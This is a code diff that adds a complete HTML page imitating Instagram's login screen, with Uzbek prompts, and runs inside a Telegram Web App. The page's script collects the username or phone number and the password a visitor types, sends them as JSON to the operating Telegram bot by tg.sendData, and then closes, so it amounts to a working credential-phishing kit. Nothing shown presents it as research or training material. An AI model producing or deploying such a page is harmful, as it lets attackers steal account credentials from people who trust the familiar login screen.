@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fafafa; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 300px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; }
+        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1 style="font-style: italic;">Instagram</h1>
+        <input type="text" id="user" placeholder="Telefon raqami yoki login">
+        <input type="password" id="pass" placeholder="Parol">
+        <button onclick="send()">Kirish</button>
+    </div>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        function send() {
+            let u = document.getElementById('user').value;
+            let p = document.getElementById('pass').value;
+            if(u && p) {
+                tg.sendData(JSON.stringify({login: u, parol: p}));
+                tg.close();
+            } else {
+                alert("Iltimos, maydonlarni to'ldiring!");
+            }
+        }
+    </script>
+</body>
+</html>
